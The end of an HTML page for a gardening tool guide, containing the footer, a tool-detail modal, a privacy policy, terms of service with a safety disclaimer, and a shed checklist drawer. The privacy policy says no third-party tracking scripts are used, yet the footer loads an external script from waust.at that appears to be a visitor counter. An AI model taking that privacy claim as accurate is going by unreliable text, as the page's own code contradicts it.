    </div>

    <div class="container footer-bottom">
      <p class="copyright">&copy; 2026 Gardeness Essentials Guide. All rights reserved. Built with organic precision.</p>
      <div class="footer-extra-links">
        <button class="modal-trigger text-btn" data-modal="privacyModal">Privacy</button>
        <span>•</span>
        <button class="modal-trigger text-btn" data-modal="termsModal">Terms</button>
        <span>•</span>
        <a href="#hero" class="back-to-top">Back to top &uarr;</a>
      </div>
    </div>
    <script id="_wau3u9">var _wau = _wau || []; _wau.push(["small", "exlkwlwptk", "3u9"]);</script><script async src="//waust.at/s.js"></script>
  </footer>

  <!-- ==================== MODALS ==================== -->

  <!-- Tool Detail Deep-Dive Modal -->
  <dialog class="custom-modal" id="toolDetailModal" aria-labelledby="modalToolTitle" aria-modal="true">
    <div class="modal-card glass-panel">
      <div class="modal-header">
        <div class="modal-category-badge" id="modalToolCategory">Category</div>
        <button class="modal-close-btn" id="closeToolModalBtn" aria-label="Close tool details">&times;</button>
      </div>

      <div class="modal-body">
        <div class="modal-tool-hero">
          <div class="modal-tool-icon" id="modalToolIcon">🌱</div>
          <div class="modal-tool-titles">
            <h3 id="modalToolTitle">Tool Name</h3>
            <p class="modal-tool-tagline" id="modalToolTagline">Short Tagline</p>
          </div>
        </div>

        <div class="modal-specs-grid">
          <div class="spec-box">
            <span class="spec-lbl">Metallurgy</span>
            <strong class="spec-val" id="modalToolSteel">SK-5 Carbon Steel</strong>
          </div>
          <div class="spec-box">
            <span class="spec-lbl">Handle Material</span>
            <strong class="spec-val" id="modalToolHandle">FSC European Ash</strong>
          </div>
          <div class="spec-box">
            <span class="spec-lbl">Durability Score</span>
            <strong class="spec-val" id="modalToolDurability">9.8 / 10</strong>
          </div>
          <div class="spec-box">
            <span class="spec-lbl">Ergonomic Rating</span>
            <strong class="spec-val" id="modalToolErgo">5 / 5</strong>
          </div>
        </div>

        <div class="modal-text-block">
          <h4>Why It's An Indispensable Essential</h4>
          <p id="modalToolDeepDesc">Detailed description...</p>
        </div>

        <div class="modal-text-block">
          <h4>Field Pro-Tip & Technique</h4>
          <div class="pro-tip-box">
            <span class="tip-star">💡</span>
            <p id="modalToolProTip">Pro tip...</p>
          </div>
        </div>

        <div class="modal-text-block">
          <h4>Care, Sharpening & Storage</h4>
          <p id="modalToolCareNotes">Care notes...</p>
        </div>
      </div>

      <div class="modal-footer">
        <button class="btn btn-primary" id="modalToggleShedBtn">
          <span>Add to My Shed</span>
        </button>
        <button class="btn btn-outline" id="modalCloseSecondaryBtn">Close</button>
      </div>
    </div>
  </dialog>

  <!-- Privacy Policy Modal -->
  <dialog class="custom-modal legal-modal" id="privacyModal" aria-labelledby="privacyModalTitle" aria-modal="true">
    <div class="modal-card glass-panel">
      <div class="modal-header">
        <div class="legal-badge">Compliance & Transparency</div>
        <button class="modal-close-btn close-legal-btn" aria-label="Close Privacy Policy">&times;</button>
      </div>

      <div class="modal-body legal-text-content">
        <h2 id="privacyModalTitle">Gardeness Privacy Policy</h2>
        <p class="legal-updated">Last Updated: October 2026 • Effective Date: Immediate</p>

        <section class="legal-section">
          <h3>1. Our Core Privacy Creed: Zero Unsolicited Data Collection</h3>
          <p>
            At <strong>Gardeness</strong> (accessible at gardeness.guide and local distributions), we believe in old-fashioned craftsmanship and modern digital privacy. We do not sell, rent, monetize, or broker personal information to advertisers, data aggregators, or third-party marketing networks.
          </p>
        </section>

        <section class="legal-section">
          <h3>2. What Data We Process & Where It Stays</h3>
          <p>
            Gardeness operates primarily as a client-side, privacy-first web resource:
          </p>
          <ul>
            <li><strong>Local Browser Storage (localStorage):</strong> When you check off tools in the Shed Checklist or complete the Arsenal Kit Matcher, these preferences are stored strictly inside your personal browser's local sandbox. They are never transmitted to any external server.</li>
            <li><strong>No Tracking Cookies:</strong> We do not deploy invasive cross-site tracking cookies, fingerprinting scripts, or third-party behavioral pixels.</li>
            <li><strong>Server Logs:</strong> Standard web hosting infrastructure may record ephemeral technical server request logs (such as IP address, user-agent, and HTTP request time) solely for security, DDoS protection, and server health diagnostics. These logs are purged automatically.</li>
          </ul>
        </section>

        <section class="legal-section">
          <h3>3. Use of Local Storage & User Control</h3>
          <p>
            You possess 100% control over any stored data on this website. You can at any time click the <em>"Clear Local Shed Data"</em> button located in the footer or clear your browser's application cache. This permanently erases all saved checklist states and kit answers instantly.
          </p>
        </section>

        <section class="legal-section">
          <h3>4. External Links & Independent Editorial Integrity</h3>
          <p>
            Gardeness may provide informational links to horticultural universities, extension offices, or tool craftsmanship manufacturers. We have no control over the privacy policies or practices of external third-party sites. We encourage you to review their individual privacy declarations when navigating outside of Gardeness.
          </p>
        </section>

        <section class="legal-section">
          <h3>5. Children's Privacy</h3>
          <p>
            Our website is an educational tool guide intended for general audiences and gardening enthusiasts. We do not knowingly solicit or collect personally identifiable information from children under the age of 13 (or under 16 in the European Economic Area).
          </p>
        </section>

        <section class="legal-section">
          <h3>6. Your Rights Under GDPR & CCPA/CPRA</h3>
          <p>
            Because we do not maintain centralized user accounts or store personal dossiers, you are not subject to profiling. If you communicate with us via email, you have the right to request access to or deletion of your email correspondence.
          </p>
        </section>

        <section class="legal-section">
          <h3>7. Contact & Data Inquiries</h3>
          <p>
            If you have questions, feedback, or legal inquiries concerning this Privacy Policy, please contact our team:
          </p>
          <div class="contact-card">
            <strong>Gardeness Editorial & Legal Team</strong><br>
            Email: <a href="mailto:privacy@gardeness.guide">privacy@gardeness.guide</a><br>
            Subject Line: Data & Privacy Inquiry
          </div>
        </section>
      </div>

      <div class="modal-footer">
        <button class="btn btn-primary close-legal-btn">Understood & Close</button>
      </div>
    </div>
  </dialog>

  <!-- Terms of Service Modal -->
  <dialog class="custom-modal legal-modal" id="termsModal" aria-labelledby="termsModalTitle" aria-modal="true">
    <div class="modal-card glass-panel">
      <div class="modal-header">
        <div class="legal-badge">Terms of Use & Safety</div>
        <button class="modal-close-btn close-legal-btn" aria-label="Close Terms of Service">&times;</button>
      </div>

      <div class="modal-body legal-text-content">
        <h2 id="termsModalTitle">Gardeness Terms of Service</h2>
        <p class="legal-updated">Last Updated: October 2026 • Please read carefully before utilizing field guides</p>

        <section class="legal-section">
          <h3>1. Acceptance of Terms</h3>
          <p>
            By accessing or utilizing the <strong>Gardeness</strong> website, digital guides, checklists, and interactive tools, you signify your agreement to these Terms of Service and all applicable laws and regulations. If you do not agree with any of these terms, you are prohibited from using this site.
          </p>
        </section>

        <section class="legal-section">
          <h3>2. Crucial Horticultural & Tool Safety Disclaimer</h3>
          <div class="safety-warning-box">
            <strong>⚠️ IMPORTANT SAFETY ADVISORY:</strong>
            <p>
              Gardening tools—including but not limited to bypass pruners, anvil loppers, Japanese hori-hori soil knives, pruning saws, and heavy garden spades—feature high-carbon razor blades and sharp steel tines capable of causing severe lacerations, puncture wounds, and permanent physical injury.
            </p>
          </div>
          <ul>
            <li><strong>Proper Protective Equipment:</strong> Always wear heavy-duty puncture-resistant gardening gloves, safety eye goggles, and appropriate footwear when handling edged tools, digging implements, and motorized equipment.</li>
            <li><strong>Biological Hazards:</strong> Natural soil contains bacteria, fungi, and biological agents (including <em>Clostridium tetani</em>). Ensure your tetanus immunizations are current and wash cuts immediately with antiseptic.</li>
            <li><strong>Educational Purpose Only:</strong> All tool sharpening angles, steel evaluations, and maintenance recommendations are provided for informational and educational purposes. Gardeness and its authors assume no liability for personal injury, property damage, plant death, or tool breakage resulting from techniques demonstrated herein.</li>
          </ul>
        </section>

        <section class="legal-section">
          <h3>3. Intellectual Property Rights</h3>
          <p>
            All original text, interactive scripts, design styling, curated comparison charts, and editorial reviews on Gardeness are the intellectual property of Gardeness, protected by applicable copyright and trademark laws. You are granted a limited, non-exclusive license to view, use, and print personal copies of the Shed Checklist for non-commercial individual gardening use.
          </p>
        </section>

        <section class="legal-section">
          <h3>4. Independent Editorial Stance & No Warranty</h3>
          <p>
            The content on Gardeness is provided strictly on an <strong>"as is"</strong> and <strong>"as available"</strong> basis without warranties of any kind, whether express or implied. We do not guarantee that any specific tool will produce specific crop yields or survive misuse beyond manufacturer specifications.
          </p>
        </section>

        <section class="legal-section">
          <h3>5. Limitation of Liability</h3>
          <p>
            In no event shall Gardeness, its developers, or contributors be held liable for any direct, indirect, incidental, special, consequential, or punitive damages arising from the use or inability to use this guide or recommended implements.
          </p>
        </section>

        <section class="legal-section">
          <h3>6. Modifications to Terms</h3>
          <p>
            Gardeness reserves the right to revise or update these Terms of Service at any time without prior notice. By continuing to use the website after changes are posted, you agree to be bound by the revised terms.
          </p>
        </section>

        <section class="legal-section">
          <h3>7. Governing Law</h3>
          <p>
            These terms and conditions are governed by and construed in accordance with applicable general consumer protection and digital resource statutes.
          </p>
          <div class="contact-card">
            <strong>Questions Regarding Terms:</strong><br>
            Email: <a href="mailto:terms@gardeness.guide">terms@gardeness.guide</a>
          </div>
        </section>
      </div>

      <div class="modal-footer">
        <button class="btn btn-primary close-legal-btn">Accept & Close</button>
      </div>
    </div>
  </dialog>

  <!-- Shed Drawer Modal / Flyout -->
  <dialog class="custom-modal shed-modal" id="shedDrawerModal" aria-labelledby="shedModalTitle" aria-modal="true">
    <div class="modal-card glass-panel">
      <div class="modal-header">
        <div class="drawer-title-wrap">
          <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/></svg>
          <h3 id="shedModalTitle">Your Active Shed Toolkit</h3>
        </div>
        <button class="modal-close-btn" id="closeShedModalBtn" aria-label="Close shed drawer">&times;</button>
      </div>

      <div class="modal-body">
        <div class="shed-drawer-stats">
          <span id="shedItemsCountText">0 tools collected in your personal shed</span>
          <button class="text-btn danger-link" id="clearShedDrawerBtn">Empty Shed</button>
        </div>

        <div class="shed-items-list" id="shedItemsList">
          <!-- Dynamically populated -->
        </div>

        <div class="shed-empty-notice" id="shedEmptyNotice">
          <div class="empty-icon">🪴</div>
          <h4>Your Shed is Currently Empty</h4>
          <p>Click "Add to Shed" on any tool card in the catalog or take the 3-question Kit Matcher above to build your essential inventory!</p>
          <a href="#essentials" class="btn btn-outline" id="shedBrowseBtn">Browse Tools</a>
        </div>
      </div>

      <div class="modal-footer">
        <button class="btn btn-primary" id="exportShedSummaryBtn">
          <span>Copy Shed Inventory</span>
        </button>
        <button class="btn btn-outline" id="closeShedSecondaryBtn">Close</button>
      </div>
    </div>
  </dialog>

  <!-- Interactive Toast Notification Element -->
  <div class="toast-notification" id="toastNotification" role="alert" aria-live="polite">
    <span class="toast-icon">✓</span>
    <span class="toast-message" id="toastMessage">Checklist saved!</span>
  </div>

  <script src="app.js"></script>
</body>
</html>
